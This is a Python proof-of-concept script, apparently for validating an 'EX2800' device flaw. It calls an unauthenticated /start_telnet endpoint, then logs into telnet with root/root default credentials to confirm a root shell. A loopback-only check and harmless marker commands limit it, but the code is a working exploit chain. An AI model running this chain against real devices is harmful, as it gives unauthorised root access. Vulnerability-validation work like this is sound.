#!/usr/bin/env python3
"""Local-only EX2800 /start_telnet validation proof.

This intentionally refuses non-loopback targets and executes only shell
built-ins that report the session UID and create a disposable marker.
"""

import argparse
import ipaddress
import re
import socket
import sys
import telnetlib
import time
import urllib.error
import urllib.request


def loopback(value: str) -> str:
    try:
        address = ipaddress.ip_address(socket.gethostbyname(value))
    except (ValueError, socket.gaierror) as exc:
        raise argparse.ArgumentTypeError(f"invalid target: {exc}") from exc
    if not address.is_loopback:
        raise argparse.ArgumentTypeError("target must resolve to loopback")
    return str(address)


def trigger(target: str, port: int) -> int:
    request = urllib.request.Request(
        f"http://{target}:{port}/start_telnet",
        headers={"Connection": "close"},
    )
    opener = urllib.request.build_opener(
        urllib.request.ProxyHandler({}),
        urllib.request.HTTPRedirectHandler(),
    )
    try:
        with opener.open(request, timeout=3) as response:
            return response.status
    except urllib.error.HTTPError as exc:
        return exc.code


def validate_shell(target: str, port: int) -> bytes:
    client = telnetlib.Telnet(target, port, 5)
    transcript = client.read_until(b"login:", 3)
    client.write(b"root\r\n")
    transcript += client.read_until(b"Password:", 3)
    client.write(b"root\r\n")
    time.sleep(1)
    try:
        transcript += client.read_very_eager()
        client.write(
            b'while IFS= read -r line; do case "$line" in Uid:*) echo "$line";; '
            b'esac; done < /proc/self/status; '
            b'echo FRIDAY_EX2800_POC > /root/friday-ex2800-poc; '
            b'echo FRIDAY_EX2800_POC\r\n'
        )
        time.sleep(1)
        transcript += client.read_very_eager()
    except EOFError:
        transcript += b"<EOF>"
    try:
        client.write(b"exit\r\n")
    except (BrokenPipeError, EOFError):
        pass
    client.close()
    return transcript


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", type=loopback, default="127.0.0.1")
    parser.add_argument("--http-port", type=int, default=80)
    parser.add_argument("--telnet-port", type=int, default=23)
    parser.add_argument("--skip-trigger", action="store_true")
    args = parser.parse_args()

    if not args.skip_trigger:
        status = trigger(args.target, args.http_port)
        print(f"trigger_http_status={status}")
        time.sleep(1)

    transcript = validate_shell(args.target, args.telnet_port)
    root = bool(re.search(rb"Uid:\s+0\s+0\s+0\s+0", transcript))
    executed = b"FRIDAY_EX2800_POC" in transcript
    print(f"root_session={str(root).lower()}")
    print(f"harmless_command_executed={str(executed).lower()}")
    print(f"transcript={transcript[-1000:]!r}")
    return 0 if root and executed else 1


if __name__ == "__main__":
    sys.exit(main())
